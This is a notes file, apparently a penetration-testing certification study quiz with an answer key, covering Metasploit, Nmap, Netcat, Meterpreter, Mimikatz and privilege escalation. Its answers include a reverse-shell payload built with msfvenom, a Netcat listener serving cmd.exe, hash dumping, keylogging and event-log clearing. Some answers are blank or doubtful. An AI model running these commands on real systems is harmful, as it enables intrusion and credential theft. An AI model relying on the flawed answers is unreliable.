@@ -1,0 +1,692 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Quiz" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="187" is_bold="1" foreground="#c061cb" ts_creation="1704279305" ts_lastsave="1708279889">
+    <rich_text>
+1.) What MSFconsole search query can be used to limit the results to only display modules compatible with Windows?
+ Ans.) search type:exploit platform:windows
+
+
+2.) Which one of the following MSFconsole commands can be used to set the global variable value for the RHOSTS option?
+ Ans.) setg RHOSTS 10.10.10.20
+ 
+ 
+ 3.)Which one of the following MSFconsole commands can be used to rename an existing workspace?
+  Ans.)  workspace -r
+  
+ 
+4.)  Which one of the following Nmap scans can be used to output scan results in to XML?
+ Ans.) nmap -sV -O 10.10.10.1 -oX output
+
+5.) Which one of the following MSFconsole commands can be used to import external Nmap scan results in to the Metasploit Framework database?
+ Ans.) db_import
+
+
+6.) Which one of the following MSF auxiliary modules can be used to perform a TCP port scan?
+ Ans
+ 
+
+7.) What is the default FTP port?
+ Ans.) 21 
+ 
+ 
+8.) What SMB auxiliary module can be used to enumerate the SMB version?
+ Ans.)  auxiliary/scanner/smb/smb_version
+ 
+ 
+9.) What HTTP auxiliary module can be used to perform file brute-force attacks on a web server?
+ Ans.) auxiliary/scanner/http/files_dir
+
+
+10.) SSH can be configured to run on any open TCP Port.
+ Ans.) True
+ 
+ 
+11.) What SMTP auxiliary module can be used to enumerate the version of SMTP running on a target?
+ Ans.) auxiliary/scanner/smtp/smtp_version
+ 
+ 
+12.) Which one of the following MSFconsole commands is used to load a custom plugin?
+ Ans.) load db_autopwn
+
+
+13.) Which one of the following MSFconsole search queries can be used to search for specific CVE's released in a specific year?
+ Ans.) search cve:2017 platform:windows
+ 
+ 
+14.) Which one of the following MSFconsole commands can be used to display the vulnerability information within the Metasploit Framework database?
+ Ans.) vulns
+ 
+ 
+15.) Which one of the following MSFconsole commands can be used to create a new target with WMAP?
+ Ans.) wmap_targets -t
+ 
+ 
+16.) Which one of the following Msfvenom commands can be used to generate an x64 Windows meterpreter payload?
+ Ans.) msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -f exe &gt; payload.exe
+ 
+17.) Msfvenom can be used to encode payloads
+ Ans.) True
+ 
+ 
+18.)An HTTP file server can be used to host a web application?
+ Ans.) True
+  
+ 
+19.) What version of SMB is vulnerable to the EternalBlue exploit?
+ Ans.) SMBv1
+ 
+ 
+ 20.)  What is the default HTTPS WinRM port?
+  Ans.) 5986
+ 
+ 
+21.)  Apache Tomcat can be used to host web applications developed in Java?
+ Ans) True
+ 
+ 
+22.) What is the default port used by Apache Tomcat?
+ Ans.) 8080
+ 
+ 
+23.)Which one of the following Msfconsole commands can be used to kill a specific session?
+ Ans.) sessions -k
+ 
+ 
+24.) Meterpreter is a staged payload?
+ Ans.) True
+ 
+ 
+25.)Which one of the following meterpreter commands can be used to enumerate our current user?
+ Ans.) getuid
+ 
+ 
+26.)  hich one of the following Msfconsole commands can be used to upgrade a command shell to a meterpreter shell automatically?
+ Ans.) sessions -u
+ 
+ 
+27.)  What version of VSFTPD is vulnerable to backdoor command execution?
+ Ans.)  V2.3.4
+
+
+28.)  Samba is the Linux implementation of SMB?
+ Ans.) True
+ 
+ 
+29.) Which one of the following Nmap scans can be used to enumerate the version of SSH running on a target?
+ Ans.)  nmap -sS -sV -p 22 10.10.10.1
+
+
+30.) The "auxiliary/scanner/ssh/libssh_auth_bypass" module can be used to spawn a TTY session on the target system, which of the following module options can be used to spawn a TTY session after running the module?
+ Ans.) set SPAWN_PTY true
+
+
+31.) Which one of the following MSFconsole search queries can be used to search for Haraka SMTP exploit modules?
+ Ans.) search type:exploit name:haraka
+
+
+32.) Haraka SMTP versions prior to V2.8.9 are vulnerable to command injection.
+ Ans) True
+
+
+33.) Which one of the following Windows commands can be used to enumerate system information manually?
+ Ans.) sysnfo 
+ 
+ 
+34.) Which one of the following MSF post modules can be used to enumerate Windows privileges?
+ Ans.) post/windows/gather/win_privs
+
+
+35.) Which one of the following meterpreter commands can be used to migrate to another process?
+ Ans.) migrate
+ 
+
+36.) Which one of the following Windows commands can be used to enumerate members of the "Administrators" group?
+ Ans) net localgroup administrators
+ 
+
+37.) What does UAC stands for?
+ Ans.) User Account Control
+ 
+ 
+38.) Which one of the following meterpreter commands can be used to list the available access tokens for impersonation?
+ Ans.) list_tokens -u
+ 
+ 
+39.) Windows Access Tokens are generated by the winlogon.exe process.
+ Ans.) True
+ 
+ 
+40.) Impersonate tokens are created as a direct result of an interactive login on Windows.
+ Ans.) False
+ 
+ 
+41.) Which one of the following meterpreter Kiwi commands can be used to dump the contents of the SAM database?
+ Ans.) lsa_dump_sam
+ 
+ 
+42.) Which one of the following meterpreter commands can be used to dump NTLM hashes?
+ Ans.) hashdump
+ 
+ 
+43.) Which one of the following MSF module options is used to set the session ID?
+ Ans.) set SESSION
+ 
+ 
+44.) Which one of the following commands can be used to authenticate with a Windows target via RDP?
+ Ans.) xfreerdp /u:administrator /p:password123 /v:10.10.10.1
+
+
+45.) Which one of the following meterpreter commands can be used to start keylogging on the target system?
+ Ans.) keyscan_start
+
+
+46.) Which one of the following meterpreter commands can be used to clear all Windows event logs on a target system?
+ Ans.) clearev
+ 
+ 
+47.) Which one of the following meterpreter commands can be used to add a network route to the target subnet?
+ Ans.)  run autoroute -s 10.10.10.1/24
+ 
+ 
+48.)  Which one of the following Msfconsole commands is used to display the information gathered by a post exploitation module from the Metasploit Framework database?
+Ans.) loot
+
+
+49.) Which one of the following MSF post exploitation modules can be used to enumerate configurations on a Linux target?
+ Ans.) post/linux/gather/enum_configs
+ 
+ 
+50.) Which one of the following Linux commands can be used to enumerate the processes tree?
+ Ans.) ps aux
+ 
+ 
+51.)  hat file contains the password hashes of user accounts on Linux?
+ Ans.) /etc/shadow
+ 
+ 
+52.) Which one of the following Linux commands can be used to create a new user account?
+ Ans.) useradd -m user
+ 
+ 
+53.) Which one of the following is not a phase of exploitation?
+ Ans.) Privilege escalation
+
+
+54.) Which one of the following commands will enable verbose output with Netcat?
+ Ans.) nc -v 192.168.1.1 21
+
+
+55.) Which one of the following Nmap commands can be used to perform service version detection and operating system detection?
+ Ans.) nmap -sV -O 192.168.1.1
+
+
+56.) What is the default path that contains all the Nmap scripts?
+ Ans.)  /usr/share/nmap/scripts
+
+
+57.) What type of MSF modules are typically used for scanning and vulnerability detection?
+ Ans.) auxiliary modules
+ 
+ 
+58.) Exploit-db allows you to filter exploits based on the target platform.
+ Ans.) True
+ 
+ 
+59.) Exploits found online are completely safe and can be run without further analysis of the code.
+Ans.) False
+
+
+60.) Exploit-db also hosts Metasploit exploit modules.
+ Ans.) True
+ 
+ 
+61.)Which one of the following SearchSploit commands can be used to copy an exploit in to your current working directory?
+ Ans.) searchsploit -m  /PATH
+ 
+ 
+62.) Which one of the following SearchSploit commands can be used to display the Exploit-db URL instead of the EDBID?
+ Ans.) searchsploit -w vsftpd
+
+
+63.) In most cases, public exploit code will need to be modified in accordance with your requirements.
+ Ans.) True
+ 
+ 
+64.) Windows exploit code developed in C can only be compiled on a Windows system.
+ Ans.)  False
+ 
+ 
+65.) Which one of the following compilers can be used to compile Linux exploit code developed in C?
+ Ans.) gcc
+ 
+ 
+66.) Netcat comes pre-installed on Windows systems.
+ Ans.) False
+ 
+ 
+67.) Which one of the following Netcat commands can be used to connect to a specific port on a target?
+ Ans.) nc -nv 192.168.1.1 22
+ 
+ 
+68.) Which one of the following Netcat commands can be used to setup a listener that executes cmd.exe when a client connects to the listener?
+ Ans.)  nc.exe -nvlp 1234 -e cmd.exe
+
+
+69.) A bind shell is a type of remote shell where the attacker connects to a listener on the target system.
+ Ans.) True
+ 
+ 
+70.) A reverse shell is a type of remote shell where the target system connects to a listener on the attackers system.
+ Ans.) True
+ 
+ 
+71.) A reverse shell connection can be made to the listener on the attacker's system without Netcat.
+ Ans.)
+ 
+ 
+72.) The Metasploit Framework can only be used for exploitation.
+ Ans.) false
+ 
+ 
+73.) Metasploit modules are developed in Perl
+ Ans.)  false
+ 
+ 
+74.) PowerShell-Empire provides you with the ability to generate Windows executable stagers developed in C#.
+ Ans.) True
+ 
+ 
+ 75.) Which one of the following commands can be used to install PowerShell-Empire on Kali Linux?
+  Ans.) sudo apt-get install powershell-empire -y
+
+
+76.) Which one of the following PowerShell-Empire client commands can be used to interact with an agent called Win7?
+ Ans.) interact Win7
+ 
+ 
+77.) A black box penetration test is a security assessment whereby the penetration tester is provided with information regarding the target system.
+ Ans.) False
+ 
+ 
+78.) Which one of the following nmap scans can be used to output scan results in to a format that can be imported in to MSF?
+ Ans.) nmap -sV 192.168.1.1 -oX results
+
+
+79.) Which one of the following Nmap scans can be used to scan the port range ranging from port 80 to 3389?
+ Ans) nmap -sV -p 80-3389 192.168.1.1
+ 
+ 
+80.) Which one of the following commands can be used to upload a file to an FTP server with the FTP client?
+ Ans.) put file.txt
+
+
+81.) Which one of the following Nmap script scans can be used to identify if anonymous FTP logons are permitted?
+ Ans.) nmap -sV -p 21 --script=ftp-anon 192.168.1.1
+ 
+ 
+82.) Which one of the following MSF module can be used to perform a brute-force attack on SSH?
+ Ans.) auxiliary/scanner/ssh/ssh_login
+
+
+83.)After obtaining legitimate user account credentials, we can remotely obtain a command shell on a Windows target with Psexec.Which one of the following tools can be used to perform a brute-force attack on SMB?
+ Ans.) True
+ 
+ 
+84.) Which one of the following tools can be used to perform a brute-force attack on SMB?
+ Ans.) hydra
+ 
+ 
+85.)  hich one of the following commands can be used to remotely authenticate to a MySQL database server?
+ Ans.) mysql -u root -p -h 192.168.1.1
+
+
+86.) What is the default TCP port used by MySQL?
+ Ans.) 3306
+ 
+87.) A black box penetration test is used to test the security of a company from the perspective of an external attacker.
+ Ans.) True
+ 
+ 
+88.) Which one of the following Nmap scans can be used to perform OS detection?
+ Ans.) nmap -sV -sC -O 192.168.1.1
+ 
+ 
+89.) In some cases vulnerable services could be patched, consequently mitigating a potential exploit.
+ Ans.) True
+ 
+ 
+90.) Which one of the following PHP config files contains the version of PHP installed on the web server?
+ Ans.) phpinfo.php
+
+
+91.) Which one of the following MSF modules can be used to enumerate the version of SAMBA running on the target?
+ Ans.) auxiliary/scanner/smb/smb_version
+
+
+92.) Shellter allows you to inject PowerShell-Empire shellcode in to portable executables.
+ Ans.) True
+ 
+ 
+93.) Signature based detection can be bypassed by modifying the malware's byte sequence.
+ Ans.) True
+ 
+ 
+94.) Which one of the following PowerShell commands can be used to import a PowerShell module?
+ Ans.) Import-Module module.psd1
+ 
+ 
+95.) PowerShell can be installed and used on Linux.
+ Ans.) True
+ 
+ 
+96.)The post-exploitation techniques you can use will differ based on the operating system running on a target.
+ Ans.) True
+ 
+ 
+97.)  Which one of the following post-exploitation phases is typically performed first?
+ Ans.) Local Enumeration
+ 
+ 
+98.) Which one of the following Windows commands can be used to enumerate a list of installed updates in addition to the HotFix URL?
+ Ans.) wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+
+99.) hich one of the following Windows commands can be used to display the members of the local administrators group?
+ Ans.) net localgroup administrators
+ 
+ 
+100.) Which one of the following Windows commands can be used to enumerate the privileges of the current user?
+ Ans.) whoami /priv
+
+
+101.) The Windows Administrator account is disabled by default unless it is explicitly enabled.
+ Ans.) True
+ 
+ 
+102.) Which one of the following Netstat commands can be used to display a list of active TCP/UDP connections?
+ Ans.) netstat -ano
+
+
+103.) Which one of the following Linux commands can be used to upgrade a non-interactive shell to a bash session?
+ Ans.) python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+104.) What meterpreter command would you typically run to identify the PID of a specific process?
+ Ans.)pgrep explorer.exe
+ 
+ 
+105.) Which one of the following Windows commands can be used to enumerate the list of running processes and the respective services being used by the processes?
+ Ans.) tasklist /SVC
+
+
+106.) Which one of the following MSF modules can be used to enumerate a list of SMB shares on the target system?
+ Ans.) windows/gather/enum_shares
+
+
+107.) Local enumeration automation scripts can replace manual local enumeration techniques.
+ Ans.) False
+ 
+ 
+108.) Which one of the following Linux commands can be used to enumerate the Distribution name and release version on a Linux system?
+ Ans.) cat /etc/*release
+
+
+109.) Which one of the following Linux commands can be used to display the groups that a specific user is a member of?
+ Ans.) groups
+ 
+ 
+110.) Which one of the following Linux commands can be used to display the primary nameserver that will be used by default?
+ Ans.) cat /etc/resolv.conf
+
+
+111.) Which one of the following Linux commands can be used to display only the processes that are running with root privileges?
+ Ans.)  ps aux | grep root
+ 
+ 
+112.) Which one of the following commands can be used to display a list of installed shells on a Linux system?
+ Ans.) cat /etc/shells
+
+ 
+113.) In addition to automating local enumeration on Linux, the LinEnum script also enumerates a list of installed compilers.
+ Ans) True
+ 
+ 
+114.) Which one of the following commands can be used to assign executable permissions to a file on Linux?
+ Ans.) chmod +x script.sh
+ 
+ 
+115.) Which one of the following commands can be used to run the http.server Python module on port 8080?
+ Ans.) python3 -m http.server 8080
+
+
+116.) </rich_text>
+    <rich_text scale="h3">Which one of the following Windows utilities can be used to download files from a remote web server?</rich_text>
+    <rich_text>
+ Ans.) certutil
+ 
+ 
+117.) Which one of the following wget commands can be used to download a file from a remote server?
+ Ans.)  </rich_text>
+    <rich_text scale="h3">wget http://192.168.1.100/file.php</rich_text>
+    <rich_text>
+
+
+118.) What PowerShell command can be used to bypass the default execution policy when running PowerShell scripts from the Windows command line?
+ Ans.)powershell -ep bypass .\script.ps1
+
+
+119.) The PrivescCheck PowerShell script can be used to identify services with weak permissions.
+ Ans.) True
+ 
+ 
+120.) After obtaining user account credentials, what protocols can we use to authenticate with the Windows target? (Select all that apply)
+ Ans.) SMB , RDP, WinRM
+ 
+ 
+121.) Which one of the following Linux commands can be used to identify files with the write permission applied for all user accounts?
+ Ans.) find / -not -type l -perm -o+w
+
+
+122.) Which one of the following Linux commands can be used to identify commands that can be executed with specific SUDO permissions?
+ Ans.) sudo -l
+ 
+ 
+123.) Establishing persistence on a system does not interfere with the functionality of the operating system.
+ Ans.) False
+ 
+ 
+124.) You require elevated privileges in order to establish persistence on a Windows system.
+ Ans.) True
+ 
+ 
+125.) In addition to using cleartext passwords for authentication with RDP, we can also utilize user account hashes.
+ Ans.) False
+ 
+ 
+126.) Which one of the following commands can be used to transfer files from a target system to our local system via SSH?
+ Ans.) scp user@192.168.1.100:/root/file.txt /home/kali/
+
+
+127.) Which one of the following crontab commands can be used to display existing cron jobs.
+ Ans.) crontab -l
+ 
+ 
+128.) Cron Jobs can be configured to run indefinitely every minute of every hour of every day.
+ Ans.) True
+ 
+ 
+129.) What hash mode would you use when cracking NTLM Hashes with Hashcat?
+ Ans.) -m 1000
+
+
+130.) What Hashcat hash mode would you use when cracking Linux password Hashes encrypted with SHA-512?
+ Ans.) -m 1800
+
+
+131.) After compromising a Linux system and elevating your privileges, you  display the content of the /etc/shadow file and discover that the  password hashes have a prefix of  
+</rich_text>
+    <rich_text family="monospace">
+"$1". What hashing algorithm corresponds with "$1"?</rich_text>
+    <rich_text>
+
+Ans.) MD5
+
+
+132.) Which one of the following Meterpreter commands can be used to add a network route for a specific subnet?
+ Ans.) run autoroute -s 192.168.1.0/24
+
+
+133.) Which one of the following Meterpreter commands can be used to execute a cleanup resource script from within Meterpreter?
+ Ans.)  resource cleanup.rc
+
+
+134.) What is the default file used to store a user account's bash history?
+ Ans.) .bash_history
+
+
+135.) </rich_text>
+    <rich_text scale="h3">Which of the following is an example of a network service?</rich_text>
+    <rich_text>
+ Ans.) ARP
+ 
+ 
+</rich_text>
+    <rich_text scale="small">136</rich_text>
+    <rich_text>.)  What distinguishes a network-based attack from other types of attacks?
+ Ans.) It relies on network traffic and network services and protocols
+
+
+137.) </rich_text>
+    <rich_text scale="h3">Which Statistic page breaks down the protocols found in the packet capture?</rich_text>
+    <rich_text>
+ Ans.)  </rich_text>
+    <rich_text scale="h3">Protocol hierarchy</rich_text>
+    <rich_text>
+ 
+ 
+138.) </rich_text>
+    <rich_text scale="h3">To capture traffic on a network, what is the first setting to check in wireshark before beginning the capture?</rich_text>
+    <rich_text>
+ Ans.)  The interface
+
+
+139.) </rich_text>
+    <rich_text scale="h3">What is one of the most useful network-based attacks?</rich_text>
+    <rich_text>
+ Ans.) MITM
+
+
+140.) </rich_text>
+    <rich_text scale="h3">Which Statistics page breaks down by addresses each machine found in the packet capture?</rich_text>
+    <rich_text>
+Ans.) NIC
+
+
+141.) </rich_text>
+    <rich_text scale="h3">In order to more easily follow a "conversation" between two machines in Wireshark, what must you choose from the right-click menu?</rich_text>
+    <rich_text>
+ Ans.) </rich_text>
+    <rich_text scale="h3">Follow &gt; TCP Stream</rich_text>
+    <rich_text>
+ 
+ 
+142.) </rich_text>
+    <rich_text scale="h3">How do you go back to the display filter you had set before?</rich_text>
+    <rich_text>
+ Ans.) Select the display filter you want from the dropdown history
+
+
+143.)</rich_text>
+    <rich_text scale="h3">What is Wireshark's default time display setting?</rich_text>
+    <rich_text>
+ Ans.) Relative time in seconds
+ 
+ 
+144.)</rich_text>
+    <rich_text scale="h3">What layers of the TCP/IP model can be identified via wireshark, looking at captured packets?</rich_text>
+    <rich_text>
+ Ans.)  All layers
+
+
+145.) </rich_text>
+    <rich_text scale="h2">Which one of the following commands can be used to display the list of scheduled cron jobs for the current user?</rich_text>
+    <rich_text>
+ Ans.) crontab -l
+
+
+146.) </rich_text>
+    <rich_text scale="h2">In order to elevate our privileges, we will need to identify an SUID binary that is owned by the "root" user.</rich_text>
+    <rich_text>
+ Ans.) True
+
+
+147.) </rich_text>
+    <rich_text scale="h2">Encrypted Linux account passwords are stored in the /etc/passwd file.</rich_text>
+    <rich_text>
+ Ans.) False
+ 
+ 
+148.) </rich_text>
+    <rich_text scale="h2">The /etc/shadow file can only be accessed by the "root" user.</rich_text>
+    <rich_text>
+ Ans.) True
+ 
+ 
+149.) </rich_text>
+    <rich_text scale="h2">Which one of the following evil-winrm commands can be used to obtain a remote PowerShell shell on a Windows target</rich_text>
+    <rich_text>
+ Ans.) </rich_text>
+    <rich_text scale="h3">evil-winrm.rb -u administrator -p 'password123' -i 192.168.1.1</rich_text>
+    <rich_text>
+
+ 
+150.) </rich_text>
+    <rich_text scale="h2">Crackmapexec can be used to execute commands on a Windows target.</rich_text>
+    <rich_text>
+ Ans.) True
+ 
+ 
+151.) </rich_text>
+    <rich_text scale="h2">Mimikatz makes a copy of the SAM database in order to extract NTLM hashes.</rich_text>
+    <rich_text>
+ Ans.) False
+ 
+ 
+152.) </rich_text>
+    <rich_text scale="h2">Which one of the following Mimikatz commands can be used to extract NTLM hashes via the LSA?</rich_text>
+    <rich_text>
+ Ans.) </rich_text>
+    <rich_text scale="h3">lsadump::sam</rich_text>
+    <rich_text>
+ 
+ 
+153.) </rich_text>
+    <rich_text scale="h2">FTP can be typically found running on port 23.</rich_text>
+    <rich_text>
+ Ans.) False
+ 
+ 
+154.) Which one of the following directories contains the Unattended Windows Setup utility configuration file?
+ Ans.) C:\Windows\Panther\Unattend.xml
+
+
+155.) Which one of the following commands can be used to remotely access a Windows target via RDP with xfreerdp?
+ Ans.) xfreerdp /u:administrator /p:password123 /v:192.168.1.1
+ 
+ 
+156.) RDP can be configured to run on a different TCP port.
+ Ans.) True
+ 
+ 
+157.) What is the tactic of spoofing well-known websites to gather information?
+ Ans.) watering hole
+ 
+ 
+158.) Which human manipulation technique of social engineering plays on a false sense of time running out?
+ Ans.) Urgency
+
+ 
+159.) What form of phishing targets high-profile or powerful individuals in particular?
+ Ans.)  Whaling</rich_text>
+  </node>
+</cherrytree>
